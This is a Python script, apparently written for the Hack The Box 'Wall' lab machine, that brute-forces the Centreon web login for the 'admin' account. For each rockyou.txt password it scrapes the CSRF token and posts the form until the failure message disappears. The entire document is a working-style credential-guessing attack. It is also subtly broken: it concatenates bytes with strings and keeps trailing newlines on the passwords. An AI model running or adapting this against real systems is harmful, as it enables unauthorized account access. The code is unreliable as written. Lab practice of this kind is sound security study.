#!/usr/bin/python3

#Custom script to crack credentials from Centreon login form (HTB: Wall machine)
#Inspired from: https://gist.github.com/mhaskar/c4255f6cf45b19b8a852c780f50576da


import requests
import sys
import warnings
from bs4 import BeautifulSoup

fd = open("/usr/share/wordlists/rockyou.txt", "rb")
passwd_list = fd.readlines()
fd.close()

for password in passwd_list:

	print("[+] Trying:" + password)
	request = requests.session()
	print("[+] Retrieving CSRF token to submit the login form")
	page = request.get("http://10.10.10.157/centreon/index.php")
	html_content = page.text
	soup = BeautifulSoup(html_content)
	token = soup.findAll('input')[3].get("value")

	login_info = {
    		"useralias": "admin",
    		"password": password,
    		"submitLogin": "Connect",
    		"centreon_token": token
	}


	login_request = request.post("http://10.10.10.157/centreon/index.php", login_info)
	print("[+] Login token is : {0}".format(token))

	if "Your credentials are incorrect." not in login_request.text:
		print("[+] Logged In Sucssfully. Password is: " + password)
		exit()
	else:
		print("[-] Wrong credentials")
